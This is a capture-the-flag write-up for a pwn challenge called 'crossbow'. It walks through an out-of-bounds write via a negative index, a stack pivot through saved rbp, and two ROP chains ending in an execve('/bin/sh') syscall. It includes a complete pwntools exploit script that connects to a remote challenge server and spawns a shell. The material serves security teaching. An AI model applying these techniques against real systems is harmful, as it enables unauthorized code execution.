# Enumeration

First of all, we start with a `checksec` and a `file`:  

```console
╰─➤  file crossbow 
crossbow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped

gdb> checksec crossbow
Arch:       amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
```

Prevents **Buffer Overflows**  
Disables **code execution** on stack 
Makes some binary sections **read-only** 

### Disassembly

Starting with `main()`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(&_stdin_FILE, 0LL, 2LL, 0LL);
  setvbuf(&_stdout_FILE, 0LL, 2LL, 0LL);
  alarm(4882LL);
  banner();
  training();
  return 0;
}
```

There is an interesting call to `training()`.

```c
__int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  __int64 v6; // rdx
  __int64 v7; // rcx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _BYTE v13[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  target_dummy((__int64)v13, (__int64)"\x1B[1;34m", v6, v7, v8, v9);
  return printf(
           (unsigned int)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",
           (unsigned int)"\x1B[1;34m",
           (unsigned int)"\x1B[1;33m",
           (unsigned int)"\x1B[1;34m",
           v10,
           v11);
}
```

Nothing but an redirect to function `target_dummy()`.

```c
__int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 result; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312LL);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1LL, 128LL);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969LL);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v13,
    v14);
  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128LL, &_stdin_FILE);
  if ( !result )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v16,
      v17);
    exit(69LL);
  }
  return result;
}
```

As observed, the code allows an **out-of-bounds (OOB) write** because we have control over `idx`, the buffer index, and there is no validation for this value. 

This likely triggers a vulnerability - possibly an out-of-bounds access or an integer underflow that allows memory manipulation.

Additionally, since `idx` is a signed integer, we can input negative values. By doing so, we can overwrite the saved `$rbp` value of the stack frame with a heap pointer to our input. Consequently, when the function concludes, the `leave` instruction will pivot the stack from its original state to the user-controlled input, effectively granting us control over the execution flow.

### Debugging 

If we enter an OOB value like `-2`, we see that we overwrite `rbp`. 

![image](https://github.com/user-attachments/assets/912615c2-851a-49ba-974a-5c5347fa361a)


Once we successfully pivot the stack to a user-controlled area, we can chain a ROP sequence using the available gadgets in the binary. Since the binary is statically linked, a `ret2libc` approach isn't an option. Instead, we need to craft an `execve("/bin/sh", NULL, NULL)` system call to achieve code execution.The exploit flow is that we need to create 2 ROP chains.

# With the first one which puts "/bin/sh" in memory, we need to find writable address.

Since there is no "/bin/sh" in the memory:
```gdb
gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
```
Let's find writable address:

![image](https://github.com/user-attachments/assets/fa48bb54-c4b0-4b82-a393-375f972828fa)

Yeah, I saw it, let's find the writable address that from `0x000000000040d000`.
And remember that, we find the address that store nothing:

![image](https://github.com/user-attachments/assets/aeb00b40-ed87-4701-aa44-a58bc959a819)

So many addresses there, let's choose a ranbom one and asign that value to RDI 

```py
rop = ROP(elf)
rop.rax=b'/bin/sh\x00'
rop.rdi=0x40da00
```

# Let's next to the second ROP chain, we create execve syscall:
```py
Sets up registers for an execve syscall:
RAX = SYS_execve (system call number for execve, which is 59 on x86_64)
RSI = 0 (NULL for argv)
RDX = 0 (NULL for envp)
Adds a "syscall" gadget to execute the system call
#code
rop1 = ROP(elf)
rop1(rax=constants.SYS_execve, rsi=0, rdx=0)
rop1.raw(rop1.find_gadget(["syscall"]))
```

# Solution

```py
from pwn import *
r=remote("94.237.60.63",49680)
elf=ELF("./crossbow")
context.arch="amd64"
r.sendlineafter("shoot: ",str(-2))
rop = ROP(elf)
rop.rax=b'/bin/sh\x00'
rop.rdi=0x40da00
print(rop.dump())
rop1 = ROP(elf)
rop1(rax=constants.SYS_execve, rsi=0, rdx=0)
rop1.raw(rop1.find_gadget(["syscall"]))
print(rop1.dump())

r.sendlineafter(">",p64(0x040ac2e)*1+rop.chain()+p64(0x00402199)+rop1.chain())
r.interactive()
```


![image](https://github.com/user-attachments/assets/8879b08a-1dc7-4289-b592-d86a81654d3c)

